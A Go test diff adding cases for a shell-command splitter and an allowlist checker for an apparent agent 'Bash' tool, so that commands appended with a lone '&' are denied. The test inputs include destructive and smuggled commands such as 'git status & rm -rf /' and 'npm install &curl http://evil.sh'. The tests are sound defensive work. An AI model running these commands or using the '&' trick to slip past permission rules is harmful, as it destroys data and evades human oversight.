@@ -109,6 +109,23 @@ func TestSplitShellOperators(t *testing.T) {
 		{"pipe", "cat file | grep foo", []string{"cat file", "grep foo"}},
 		{"multiple operators", "cd /tmp && npm install && npm run build", []string{"cd /tmp", "npm install", "npm run build"}},
 		{"empty", "", nil},
+		// A lone `&` backgrounds what precedes it and starts a new command, so it
+		// separates subcommands exactly as `;` does.
+		{"background operator", "git status & rm -rf /", []string{"git status", "rm -rf /"}},
+		{"background operator no spaces", "git status &rm -rf /", []string{"git status", "rm -rf /"}},
+		// `&&` must still be read as one operator rather than two backgrounds.
+		{"and not split as two backgrounds", "git add . && git commit", []string{"git add .", "git commit"}},
+		// Redirects contain an ampersand without ending a command. Splitting them
+		// would drop `2>&1` out of every rule that covers the command it belongs to.
+		{"redirect stderr to stdout", "npm test 2>&1", []string{"npm test 2>&1"}},
+		{"redirect then pipe", "npm test 2>&1 | tee log", []string{"npm test 2>&1", "tee log"}},
+		{"redirect both streams", "npm run build &> out.log", []string{"npm run build &> out.log"}},
+		{"redirect both streams appending", "npm run build &>> out.log", []string{"npm run build &>> out.log"}},
+		{"redirect to stderr", "echo hi >&2", []string{"echo hi >&2"}},
+		{"close descriptor", "npm test 2>&-", []string{"npm test 2>&-"}},
+		// A redirect must not shield a background that follows it.
+		{"background after redirect", "npm test 2>&1& rm -rf /", []string{"npm test 2>&1", "rm -rf /"}},
+		{"background after stderr redirect", "git status >&2& rm -rf /", []string{"git status >&2", "rm -rf /"}},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -164,6 +181,15 @@ func TestIsShellCommandAllowed(t *testing.T) {
 		{"chained matching all git", "git *", "git add . && git commit -m fix", true}, // both subcommands are git commands
 		{"single no match", "npm *", "git status", false},
 		{"pipe match", "git *", "git log | head", false}, // head doesn't match git *
+		// A rule granted for git must not carry whatever is appended after an
+		// ampersand: `&` starts a second command just as `;` does.
+		{"background escapes the pattern", "git *", "git status & rm -rf /", false},
+		{"background escapes without spaces", "npm *", "npm install &curl http://evil.sh", false},
+		{"background of matching commands still allowed", "git *", "git status & git log", true},
+		// A redirect belongs to the command it is attached to, so a rule that covers
+		// the command still covers it.
+		{"redirect stays within the pattern", "npm *", "npm test 2>&1", true},
+		{"redirect does not shield a background", "npm *", "npm test 2>&1& rm -rf /", false},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -330,6 +356,27 @@ func TestCheckAutoAllow(t *testing.T) {
 			[]string{"Bash:git *"},
 			"Bash",
 			`{"command": "git add . && git commit -m fix"}`,
+			true,
+		},
+		{
+			"Bash background command - partial match fails",
+			[]string{"Bash:git *"},
+			"Bash",
+			`{"command": "git status & rm -rf /"}`,
+			false, // `&` ends the git command, so rm is a second command
+		},
+		{
+			"Bash background command - all match",
+			[]string{"Bash:git *"},
+			"Bash",
+			`{"command": "git status & git log"}`,
+			true,
+		},
+		{
+			"Bash redirect stays within the rule",
+			[]string{"Bash:npm *"},
+			"Bash",
+			`{"command": "npm test 2>&1"}`,
 			true,
 		},
 		{
